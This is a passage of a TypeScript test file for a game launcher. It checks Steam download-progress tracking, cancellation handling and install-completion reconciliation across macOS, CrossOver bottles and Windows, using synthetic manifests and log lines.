            out.push(node);
          }
          if (node.props?.children) {
            collectCards(node.props.children, out);
          }
          return out;
        };

        const renderedCards = collectCards(tree);
        expect(renderedCards.length).toBeGreaterThan(0);
        expect(renderedCards.length).toBeLessThan(60);
      } finally {
        for (const c of cleanups) c?.();
        (globalThis as any).document = origDocument;
      }
    });
  });

  // ============================================================================
  // 5. Dual-OS Live Steam Install Progress & Completion Reconciliation
  // ============================================================================
  describe('5. Dual-OS Live Steam Install Progress & Completion Reconciliation (macOS Native .app, CrossOver Bottle .exe, Windows Native .exe)', () => {
    const formatSteamLogTs = (ms: number): string => {
      const d = new Date(ms);
      const pad = (n: number) => String(n).padStart(2, '0');
      return `${d.getFullYear()}-${pad(d.getMonth() + 1)}-${pad(d.getDate())} ${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
    };

    it('runs non-isolated discoverSteamLocations() without options.homedir on darwin and win32 with zero ReferenceError', () => {
      const darwinLocs = launcherEngine.discoverSteamLocations({ platform: 'darwin' });
      expect(Array.isArray(darwinLocs.steamRoots)).toBe(true);
      expect(Array.isArray(darwinLocs.steamappsDirs)).toBe(true);

      const regSpy = vi
        .spyOn(windowsRegistryDiscovery, 'discoverWindowsSteamRegistryPaths')
        .mockReturnValue({ steamPath: '', source: 'none' });
      try {
        const winLocs = launcherEngine.discoverSteamLocations({ platform: 'win32' });
        expect(Array.isArray(winLocs.steamRoots)).toBe(true);
        expect(Array.isArray(winLocs.steamappsDirs)).toBe(true);
      } finally {
        regSpy.mockRestore();
      }
    });

    it('tracks uninterrupted macOS native Steam .app download incrementally (0% -> >15% -> >60% -> 99% Finalizing -> 100% Installed) when appmanifest stays buffered at BytesDownloaded = 0', async () => {
      const tmpHome = trackTempDir('steam-mac-bg2-live');
      const tmpUserData = path.join(tmpHome, 'userdata');
      const steamRoot = path.join(tmpHome, 'Library', 'Application Support', 'Steam');
      const steamappsDir = path.join(steamRoot, 'steamapps');
      const logsDir = path.join(steamRoot, 'logs');
      const appId = 257350;
      const installDirName = "Baldur's Gate II Enhanced Edition";
      const commonDir = path.join(steamappsDir, 'common', installDirName);
      const macAppBin = path.join(
        commonDir,
        'BaldursGateIIEnhancedEdition.app',
        'Contents',
        'MacOS',
        'BaldursGateIIEnhancedEdition'
      );
      const acfPath = path.join(steamappsDir, `appmanifest_${appId}.acf`);
      const logPath = path.join(logsDir, 'content_log.txt');

      fs.mkdirSync(steamappsDir, { recursive: true });
      fs.mkdirSync(logsDir, { recursive: true });
      fs.mkdirSync(tmpUserData, { recursive: true });

      const totalDownloadBytes = 3297269344;
      const totalStageBytes = 3901662055;
      const baseMs = Math.floor(Date.now() / 1000) * 1000 - 200000;

      const writeBufferedAcf = (stateFlags: string, bytesDownloaded: number) => {
        fs.writeFileSync(
          acfPath,
          `"AppState"\n{\n\t"appid"\t\t"${appId}"\n\t"Universe"\t\t"1"\n\t"name"\t\t"Baldur's Gate II: Enhanced Edition"\n\t"StateFlags"\t\t"${stateFlags}"\n\t"installdir"\t\t"${installDirName}"\n\t"SizeOnDisk"\t\t"${totalStageBytes}"\n\t"buildid"\t\t"23534562"\n\t"BytesToDownload"\t\t"${totalDownloadBytes}"\n\t"BytesDownloaded"\t\t"${bytesDownloaded}"\n\t"BytesToStage"\t\t"${totalStageBytes}"\n\t"BytesStaged"\t\t"${bytesDownloaded > 0 ? totalStageBytes : 0}"\n}\n`,
          'utf8'
        );
      };

      // Steam buffers BytesDownloaded = 0 in RAM throughout the uninterrupted download
      writeBufferedAcf('1026', 0);
      fs.utimesSync(acfPath, new Date(baseMs + 4000), new Date(baseMs + 4000));

      const opts = {
        platform: 'darwin',
        homedir: tmpHome,
        userDataDir: tmpUserData,
        steamPollIntervalMs: 20,
        minLogTimestampMs: baseMs,
      };

      const nowSpy = vi.spyOn(Date, 'now').mockReturnValue(baseMs + 3000);
      try {
        const initRes = await launcherEngine.installGame(
          {
            gameId: 'steam-257350',
            title: "Baldur's Gate II: Enhanced Edition",
            platformId: 'steam',
            platformGameId: 'steam-257350',
            manualControl: true,
          },
          opts
        );
        expect(initRes.success).toBe(true);
        expect(initRes.task.steamAppId).toBe(257350);
        const taskId = initRes.task.taskId;

        // Phase 1: Preallocating (0%)
        fs.writeFileSync(
          logPath,
          [
            `[${formatSteamLogTs(baseMs + 1000)}] AppID ${appId} state changed : Update Required,Update Queued,Update Running,`,
            `[${formatSteamLogTs(baseMs + 3000)}] AppID ${appId} App update changed : Running Update,Preallocating,`,
          ].join('\n') + '\n',
          'utf8'
        );

        launcherEngine.startSteamInstallMonitor(taskId, appId, opts);
        let task: any;
        await vi.waitFor(
          () => {
            task = launcherEngine.getDownloadQueue().find((t: any) => t.taskId === taskId);
            expect(task?.progressPercent).toBe(0);
            expect(task?.statusMessage).toContain('Preallocating');
          },
          { timeout: 3000, interval: 15 }
        );

        // Phase 2: Download started + Update Required,...,Update Started on next line + first two bandwidth samples (~24% at +70s)
        const logLinesPhase2 = [
          `[${formatSteamLogTs(baseMs + 1000)}] AppID ${appId} state changed : Update Required,Update Queued,Update Running,`,
          `[${formatSteamLogTs(baseMs + 3000)}] AppID ${appId} App update changed : Running Update,Preallocating,`,
          `[${formatSteamLogTs(baseMs + 4000)}] AppID ${appId} update started : download 0/${totalDownloadBytes}, store 0/0, reuse 0/0, delta 0/0, stage 0/${totalStageBytes}`,
          `[${formatSteamLogTs(baseMs + 4000)}] AppID ${appId} state changed : Update Required,Update Queued,Update Running,Update Started,`,
          `[${formatSteamLogTs(baseMs + 4000)}] AppID ${appId} App update changed : Running Update,Downloading,Staging,`,
          `[${formatSteamLogTs(baseMs + 13000)}] Increasing target number of download connections to 9 (rate was 0.000, now 67.578)`,
          `[${formatSteamLogTs(baseMs + 26000)}] Increasing target number of download connections to 10 (rate was 67.578, now 113.961)`,
        ];
        fs.writeFileSync(logPath, logLinesPhase2.join('\n') + '\n', 'utf8');
        nowSpy.mockReturnValue(baseMs + 74000);
        await vi.waitFor(
          () => {
            task = launcherEngine.getDownloadQueue().find((t: any) => t.taskId === taskId);
            expect(task?.status).toBe('downloading');
            expect(task?.totalBytes).toBe(totalDownloadBytes);
            expect(task?.progressPercent).toBeGreaterThanOrEqual(18);
            expect(task?.progressPercent).toBeLessThan(40);
            expect(task?.speedBytesPerSec).toBeGreaterThan(0);
            expect(task?.etaSeconds).toBeGreaterThan(0);
          },
          { timeout: 3000, interval: 15 }
        );

        // Phase 3: Mid-late download (+155s -> ~64%) while appmanifest STILL has BytesDownloaded = 0
        const logLinesPhase3 = [
          ...logLinesPhase2,
          `[${formatSteamLogTs(baseMs + 74000)}] Current download rate: 133.998 Mbps`,
          `[${formatSteamLogTs(baseMs + 135000)}] Current download rate: 130.084 Mbps`,
        ];
        fs.writeFileSync(logPath, logLinesPhase3.join('\n') + '\n', 'utf8');
        nowSpy.mockReturnValue(baseMs + 175000);
        await vi.waitFor(
          () => {
            task = launcherEngine.getDownloadQueue().find((t: any) => t.taskId === taskId);
            expect(task?.progressPercent).toBeGreaterThanOrEqual(60);
            expect(task?.progressPercent).toBeLessThanOrEqual(98);
          },
          { timeout: 3000, interval: 15 }
        );

        // Phase 4: Committing (99% Finalizing) before StateFlags flips to 4
        const logLinesPhase4 = [
          ...logLinesPhase3,
          `[${formatSteamLogTs(baseMs + 196000)}] Current download rate: 133.250 Mbps`,
          `[${formatSteamLogTs(baseMs + 212000)}] AppID ${appId} App update changed : Running Update,`,
          `[${formatSteamLogTs(baseMs + 212000)}] AppID ${appId} App update changed : Running Update,Committing,`,
        ];
        fs.writeFileSync(logPath, logLinesPhase4.join('\n') + '\n', 'utf8');
        nowSpy.mockReturnValue(baseMs + 212500);
        await vi.waitFor(
          () => {
            task = launcherEngine.getDownloadQueue().find((t: any) => t.taskId === taskId);
            expect(task?.progressPercent).toBe(99);
            expect(task?.status).toBe('extracting');
            expect(task?.statusMessage).toContain('Finalizing');
          },
          { timeout: 3000, interval: 15 }
        );

        // Phase 5: Steam commits macOS .app bundle and flushes StateFlags = 4
        fs.mkdirSync(path.dirname(macAppBin), { recursive: true });
        fs.writeFileSync(
          path.join(commonDir, 'BaldursGateIIEnhancedEdition.app', 'Contents', 'Info.plist'),
          `<?xml version="1.0" encoding="UTF-8"?><plist version="1.0"><dict><key>CFBundleExecutable</key><string>BaldursGateIIEnhancedEdition</string></dict></plist>`,
          'utf8'
        );
        fs.writeFileSync(macAppBin, Buffer.from([0xcf, 0xfa, 0xed, 0xfe, 0x0c, 0x00, 0x00, 0x01]), {
          mode: 0o755,
        });
        writeBufferedAcf('4', totalDownloadBytes);
        fs.writeFileSync(
          logPath,
          [
            ...logLinesPhase4,
            `[${formatSteamLogTs(baseMs + 213000)}] AppID ${appId} App update changed : None`,
            `[${formatSteamLogTs(baseMs + 213000)}] AppID ${appId} state changed : Fully Installed,`,
          ].join('\n') + '\n',
          'utf8'
        );
        nowSpy.mockReturnValue(baseMs + 213500);
        await vi.waitFor(
          () => {
            task = launcherEngine.getDownloadQueue().find((t: any) => t.taskId === taskId);
            expect(task?.status).toBe('completed');
            expect(task?.progressPercent).toBe(100);
          },
          { timeout: 3000, interval: 15 }
        );
        expect(task.finalInstallPath).toBe(commonDir);
        expect(task.executablePath).toBe(macAppBin);
        expect(task.isWindowsBinaryOnMac).toBe(false);
        expect(task.runner).toBe('steam');

        const scanRes = launcherEngine.scanAllInstalledGames({
          platform: 'darwin',
          homedir: tmpHome,
          userDataDir: tmpUserData,
          forceRefresh: true,
        });
        const installedBg2 = scanRes.installedGames.find((g: any) => g.appId === appId);
        expect(installedBg2).toBeDefined();
        expect(installedBg2.executablePath).toBe(macAppBin);
        expect(installedBg2.isWindowsBinaryOnMac).toBe(false);
      } finally {
        nowSpy.mockRestore();
        launcherEngine.clearDownloadQueue();
      }
    });

    it('re-anchors bandwidth integration on mid-download CrossOver bottle .acf flushes and handles external Steam client cancellation', async () => {
      const tmpHome = trackTempDir('steam-bottle-checkpoint-cancel');
      const tmpUserData = path.join(tmpHome, 'userdata');
      const bottleSteamRoot = path.join(
        tmpHome,
        'Library',
        'Application Support',
        'CrossOver',
        'Bottles',
        'OneLauncher',
        'drive_c',
        'Program Files (x86)',
        'Steam'
      );
      const steamappsDir = path.join(bottleSteamRoot, 'steamapps');
      const logsDir = path.join(bottleSteamRoot, 'logs');
      fs.mkdirSync(steamappsDir, { recursive: true });
      fs.mkdirSync(logsDir, { recursive: true });
      fs.mkdirSync(tmpUserData, { recursive: true });

      const appId = 620;
      const totalBytes = 1000000000; // 1 GB
      const acfPath = path.join(steamappsDir, `appmanifest_${appId}.acf`);
      const logPath = path.join(logsDir, 'content_log.txt');
      const baseMs = Math.floor(Date.now() / 1000) * 1000 - 120000;

      // Simulate mid-download .acf checkpoint at 500 MB (50%) flushed at baseMs + 30s
      fs.writeFileSync(
        acfPath,
        `"AppState"\n{\n\t"appid"\t\t"${appId}"\n\t"name"\t\t"Portal 2"\n\t"StateFlags"\t\t"1026"\n\t"installdir"\t\t"Portal 2"\n\t"BytesToDownload"\t\t"${totalBytes}"\n\t"BytesDownloaded"\t\t"500000000"\n}\n`,
        'utf8'
      );
      fs.utimesSync(acfPath, new Date(baseMs + 30000), new Date(baseMs + 30000));

      // Rate sample of 80 Mbps (10 MB/s) at baseMs + 30s -> over next 20s adds +200 MB => 700 MB (70%)
      fs.writeFileSync(
        logPath,
        [
          `[${formatSteamLogTs(baseMs + 2000)}] AppID ${appId} update started : download 0/${totalBytes}, stage 0/${totalBytes}`,
          `[${formatSteamLogTs(baseMs + 2000)}] AppID ${appId} App update changed : Running Update,Downloading,Staging,`,
          `[${formatSteamLogTs(baseMs + 30000)}] Current download rate: 80.000 Mbps`,
        ].join('\n') + '\n',
        'utf8'
      );

      const opts = {
        platform: 'darwin',
        homedir: tmpHome,
        userDataDir: tmpUserData,
        steamPollIntervalMs: 20,
        minLogTimestampMs: baseMs,
      };

      const nowSpy = vi.spyOn(Date, 'now').mockReturnValue(baseMs + 50000);
      try {
        const initRes = await launcherEngine.installGame(
          {
            gameId: 'steam-620-bottle',
            title: 'Portal 2',
            platformId: 'steam',
            platformGameId: '620',
            steamAppId: 620,
            manualControl: true,
          },
          opts
        );
        const taskId = initRes.task.taskId;
        launcherEngine.startSteamInstallMonitor(taskId, appId, opts);
        await vi.waitFor(
          () => {
            const task = launcherEngine.getDownloadQueue().find((t: any) => t.taskId === taskId);
            expect(task?.progressPercent).toBe(70);
          },
          { timeout: 3000, interval: 15 }
        );

        // User cancels install inside Steam client -> Steam removes appmanifest and logs update canceled
        fs.rmSync(acfPath, { force: true });
        fs.writeFileSync(
          logPath,
          [
            `[${formatSteamLogTs(baseMs + 2000)}] AppID ${appId} update started : download 0/${totalBytes}, stage 0/${totalBytes}`,
            `[${formatSteamLogTs(baseMs + 2000)}] AppID ${appId} App update changed : Running Update,Downloading,Staging,`,
            `[${formatSteamLogTs(baseMs + 30000)}] Current download rate: 80.000 Mbps`,
            `[${formatSteamLogTs(baseMs + 55000)}] AppID ${appId} update canceled : Disabled (User canceled)`,
            `[${formatSteamLogTs(baseMs + 55000)}] AppID ${appId} App update changed : None`,
          ].join('\n') + '\n',
          'utf8'
        );
        nowSpy.mockReturnValue(baseMs + 56000);
        await vi.waitFor(
          () => {
            const task = launcherEngine.getDownloadQueue().find((t: any) => t.taskId === taskId);
            expect(task?.status).toBe('cancelled');
          },
          { timeout: 3000, interval: 15 }
        );
      } finally {
        nowSpy.mockRestore();
        launcherEngine.clearDownloadQueue();
      }
    });

    it('reconciles queue-polled Steam completion in LauncherService (without data.task) and marks steam-<appId> games installed immediately', async () => {
      const prevWindow = (globalThis as any).window;
      let downloadListener: ((payload: any) => void) | undefined;
      const dispatchedEvents: CustomEvent[] = [];
      const scanSpy = vi.fn().mockResolvedValue({
        success: true,
        installedGames: [
          {
            platformId: 'steam',
            platformGameId: '257350',
            appId: 257350,
            title: "Baldur's Gate II: Enhanced Edition",
            installPath: '/tmp/synthetic-steam/common/BG2EE',
            executablePath: '/tmp/synthetic-steam/common/BG2EE/BG2EE.app/Contents/MacOS/BG2EE',
            runner: 'steam',
            isWindowsBinaryOnMac: false,
          },
        ],
      });

      const mockWindow: any = {
        addEventListener: vi.fn(),
        removeEventListener: vi.fn(),
        dispatchEvent: (ev: CustomEvent) => {
          dispatchedEvents.push(ev);
          return true;
        },
        electronAPI: {
          platform: 'darwin',
          onDownloadUpdated: (cb: (payload: any) => void) => {
            downloadListener = cb;
            return () => {};
          },
          onSessionUpdated: () => () => {},
          onHibernateStateChanged: () => () => {},
          getGameLaunchConfigs: async () => ({}),
          getRunningGames: async () => [],
          getDownloadQueue: async () => [
            {
              taskId: 'dl-bg2-poll',
              gameId: 'steam-257350',
              title: "Baldur's Gate II: Enhanced Edition",
              platformId: 'steam',
              platformGameId: 'steam-257350',
              steamAppId: 257350,
              installDir: '/tmp/synthetic-steam/common',
              status: 'downloading',
              progressPercent: 42,
              bytesDownloaded: 1384853124,
              totalBytes: 3297269344,
              speedBytesPerSec: 16250000,
              startedAt: new Date().toISOString(),
            },
          ],
          detectCompatibilityLayers: async () => [],
          scanAllInstalledGames: async () => ({ success: true, installedGames: [] }),
        },
      };

      (globalThis as any).window = mockWindow;
      try {
        const svc = new LauncherService();
        await svc.initialize();

        const bg2CatalogGame: CanonicalGame = {
          id: 'steam-257350',
          title: "Baldur's Gate II: Enhanced Edition",
          platforms: [
            {
              platformId: 'steam',
              platformGameId: 'steam-257350',
              installed: false,
            },
          ],
        } as CanonicalGame;

        expect(svc.isGameInstalled(bg2CatalogGame)).toBe(false);

        // Wire scanSpy for post-completion rescan and deliver queue-only completion payload (simulating ensureActiveDownloadPolling)
        mockWindow.electronAPI.scanAllInstalledGames = scanSpy;
        expect(downloadListener).toBeTypeOf('function');
        downloadListener!({
          queue: [
            {
              taskId: 'dl-bg2-poll',
              gameId: 'steam-257350',
              title: "Baldur's Gate II: Enhanced Edition",
              platformId: 'steam',
              platformGameId: 'steam-257350',
              steamAppId: 257350,
              installDir: '/tmp/synthetic-steam/common',
              finalInstallPath: '/tmp/synthetic-steam/common/BG2EE',
              executablePath: '/tmp/synthetic-steam/common/BG2EE/BG2EE.app/Contents/MacOS/BG2EE',
              runner: 'steam',
              isWindowsBinaryOnMac: false,
              status: 'completed',
              progressPercent: 100,
              bytesDownloaded: 3901662055,
              totalBytes: 3901662055,
              speedBytesPerSec: 0,
              startedAt: new Date().toISOString(),
            },
          ],
        });

        expect(svc.isGameInstalled(bg2CatalogGame)).toBe(true);
        const installedRec = svc.getInstalledRecordForGame(bg2CatalogGame, 'steam');
        expect(installedRec?.runner).toBe('steam');
        expect(installedRec?.appId).toBe(257350);
        expect(dispatchedEvents.some((e) => e.type === 'antigravity:game-installed')).toBe(true);
        expect(scanSpy).toHaveBeenCalled();
        await new Promise((r) => setTimeout(r, 10));
      } finally {
        (globalThis as any).window = prevWindow;
      }
    });
  });
});
